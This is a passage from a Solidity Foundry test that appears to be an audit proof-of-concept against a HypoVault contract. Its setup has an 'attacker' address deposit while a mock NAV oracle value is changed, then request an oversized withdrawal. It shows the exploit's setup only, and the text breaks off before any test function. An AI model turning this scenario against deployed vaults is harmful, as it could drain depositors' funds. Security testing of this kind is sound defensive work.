import {ERC20S} from "lib/panoptic-v1.1/test/foundry/testUtils/ERC20S.sol";

contract NavMock {
    uint256 public nav;
    function computeNAV(address,address,bytes memory) external view returns (uint256) { return nav; }
    function setNav(uint256 n) external { nav = n; }
}

contract LiveStateSim is Test {
    HypoVault vault; ERC20S token; NavMock acc;
    address attacker = address(0xA);
    address manager = address(this);
    function setUp() public {
        token=<redacted> ERC20S("T","T",18);
        acc = new NavMock();
        vault = new HypoVault(address(token), manager, IVaultAccountant(address(acc)), 100);
        token.mint(address(vault), 1100 ether);
        token.mint(attacker, 100 ether);
        vm.prank(attacker); token.approve(address(vault), type(uint256).max);
        acc.setNav(1000 ether);
        vm.prank(attacker); vault.requestDeposit(100 ether);
        acc.setNav(1100 ether);
        vault.fulfillDeposits(100 ether, 0x);
        vault.executeDeposit(attacker, 0);
        vm.prank(attacker); vault.requestWithdrawal(100_000_000 ether);
    }
